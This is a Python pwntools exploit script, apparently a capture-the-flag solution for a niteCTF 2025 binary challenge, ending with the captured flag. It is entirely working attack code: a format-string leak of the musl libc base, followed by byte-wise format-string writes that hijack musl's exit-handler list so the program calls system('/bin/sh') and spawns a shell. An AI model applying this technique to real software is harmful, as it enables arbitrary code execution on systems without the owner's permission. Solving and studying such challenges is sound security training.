from pwn import *

context.arch = 'amd64'
context.bits = 64
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./chall_patched', '''
    # b *0x401657
    continue
''')

# p = remote('yellow.chals.nitectf25.live', 1337, ssl=True)

def make_char(char_index, char_name):
    p.sendlineafter(b">>", b'1')
    p.sendlineafter(b"enter index:\n", str(char_index).encode())
    p.sendlineafter(b">>", b'1')
    p.sendafter(b">>", char_name)

def defeat_king(char_index, message):
    p.sendlineafter(b">>", b'2')
    p.sendlineafter(b"enter index:\n", str(char_index).encode())
    p.sendafter(b"You may leave a message about your encounter and leave..\n", message)

def return_main():
    p.sendlineafter(b">>", b'3')

musl_e = ELF('./libc.so')

# 1. leak musl base address through fmtstr
make_char(0, b'A'*0x20)
defeat_king(0, b'%p'*6)
musl_base_addr = int(p.recvuntil(b"---MUD---\n", drop=True)[-14:], 16)-0xbe280
log.info(f"musl base address: {hex(musl_base_addr)}")

# 2. perform __funcs_on_exit abuse to trigger system("/bin/sh\x00") on exit
for i in range(8):
    if 0x404800>>(i*8)&0xff != 0:
        defeat_king(0, fmtstr_payload(offset=8, writes={musl_base_addr+musl_e.symbols['head']+i: 0x404800>>(i*8)&0xff}, write_size='byte', no_dollars=True))
        defeat_king(0, fmtstr_payload(offset=8, writes={0x404800+i: 0x404800>>(i*8)&0xff}, write_size='byte', no_dollars=True))
for i in range(8):
    if (musl_base_addr+musl_e.sym.system)>>(i*8)&0xff != 0:
        defeat_king(0, fmtstr_payload(offset=8, writes={0x404800+0x100+i: (musl_base_addr+musl_e.sym.system)>>(i*8)&0xff}, write_size='byte', no_dollars=True))
for i in range(8):
    if (musl_base_addr+next(musl_e.search(b'/bin/sh\x00')))>>(i*8)&0xff != 0:
        defeat_king(0, fmtstr_payload(offset=8, writes={0x404800+0x200+i: (musl_base_addr+next(musl_e.search(b'/bin/sh\x00')))>>(i*8)&0xff}, write_size='byte', no_dollars=True))
return_main()

p.interactive()

# https://7rocky.github.io/en/ctf/other/crewctf/format-muscle/
# nite{b34TinG_yeLl0wk1ng_1n_ng+_w1thNo$$s}